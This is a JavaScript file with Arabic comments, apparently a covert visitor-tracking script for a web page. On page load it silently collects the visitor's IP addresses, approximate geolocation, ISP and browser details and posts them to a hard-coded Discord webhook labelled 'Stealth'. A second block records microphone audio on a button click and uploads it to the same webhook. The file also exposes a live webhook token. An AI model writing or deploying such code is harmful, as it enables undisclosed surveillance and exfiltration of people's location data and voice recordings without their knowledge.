
// === تتبع خفي: IP + موقع تقريبي + عدد الزيارات + IPv6 (إن وجد) ===

(async function () {
    try {
        // نحاول جلب IP v4 و IP v6
        const ip4Response = await fetch("https://api.ipify.org?format=json");
        const ip4Data = await ip4Response.json();
        const ipv4 = ip4Data.ip;

        let ipv6 = "غير متوفر";
        try {
            const ip6Response = await fetch("https://api64.ipify.org?format=json");
            const ip6Data = await ip6Response.json();
            ipv6 = ip6Data.ip;
        } catch (e) {
            console.log("IPv6 غير متوفر");
        }

        // جلب معلومات الموقع
        const locationResponse = await fetch("https://ipapi.co/json/");
        const locationData = await locationResponse.json();

        // عداد مرات الزيارة بناءً على IP
        let visitCountKey = `visit_count_${ipv4}`;
        let visitCount = localStorage.getItem(visitCountKey);
        if (!visitCount) visitCount = 1;
        else visitCount = parseInt(visitCount) + 1;
        localStorage.setItem(visitCountKey, visitCount);

        // إعداد البيانات المرسلة
        const payload = {
            IPv4: ipv4,
            IPv6: ipv6,
            City: locationData.city,
            Region: locationData.region,
            Country: locationData.country_name,
            Latitude: locationData.latitude,
            Longitude: locationData.longitude,
            ISP: locationData.org,
            Browser: navigator.userAgent,
            Platform: navigator.platform,
            Language: navigator.language,
            VisitCount: visitCount
        };

        // إرسال للديسكورد
        await fetch("https://discord.com/api/webhooks/1365249447151538216/hSASwWLb_cJRrREl1meba1VVWEg5YbwwLU3fXSAMSJgjNT0ih9woItQlx0BwOrKe47Hm", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: "New Visitor Tracked Silently",
                embeds: [{
                    title: "Visitor Info (Stealth)",
                    fields: Object.entries(payload).map(([key, value]) => ({ name: key, value: String(value) }))
                }]
            })
        });

    } catch (e) {
        console.error("Stealth tracking failed:", e);
    }
})();

// === تسجيل الصوت عند الضغط على زر "تسجيل صوتك" ===
let mediaRecorder;
let audioChunks = [];

document.addEventListener("DOMContentLoaded", () => {
    const btn = document.getElementById("recordButton");
    if (!btn) return;

    btn.addEventListener("click", async () => {
        if (!mediaRecorder || mediaRecorder.state === 'inactive') {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            mediaRecorder = new MediaRecorder(stream);

            mediaRecorder.ondataavailable = event => {
                audioChunks.push(event.data);
            };

            mediaRecorder.onstop = async () => {
                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                const formData = new FormData();
                formData.append('file', audioBlob, 'voice.webm');

                await fetch("https://discord.com/api/webhooks/1365249447151538216/hSASwWLb_cJRrREl1meba1VVWEg5YbwwLU3fXSAMSJgjNT0ih9woItQlx0BwOrKe47Hm", {
                    method: 'POST',
                    body: formData
                });

                audioChunks = [];
            };

            mediaRecorder.start();
            btn.textContent = 'إيقاف التسجيل';
        } else if (mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
            btn.textContent = 'بدء تسجيل الصوت';
        }
    });
});
